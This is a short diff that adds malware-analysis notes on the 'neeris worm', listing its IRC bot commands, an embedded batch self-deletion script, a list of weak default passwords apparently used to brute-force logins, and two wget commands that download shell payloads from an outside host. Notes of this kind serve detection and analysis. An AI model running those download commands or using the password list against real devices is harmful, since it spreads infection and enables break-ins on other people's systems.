@@ -1,1 +1,58 @@
 neeris worm
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+important strings
+
+bot commands
+------------------
+PING
+VERSION
+NICK [%s|%s|%s|%s|%s]
+
+embedded script
+===================
+del "%s">nul
+if exist "%s" goto Repeat
+del "%%0"
+@echo off
+:Repeat
+del "%s">nul
+ping 0.0.0.0>nul
+if exist "%s" goto Repeat
+del "%%0"
+%s\removeMe%i%i%i%i.bat
+
+other strings
+============
+admin007
+admin69
+tomato
+username
+telnet
+backup4
+backup2
+backup1
+nimda
+toor
+lilly
+ruby
+grace
+sophie
+jessica
+oscar
+matthew
+matt
+lewis
+ryan
+william
+ethan
+callum
+benjamin
+harry
+samuel
+
+URLS's
+=============
+busybox wget http://wireless.kei.su//bbsh                  
+wget http://wireless.kei.su/wgsh
+
+
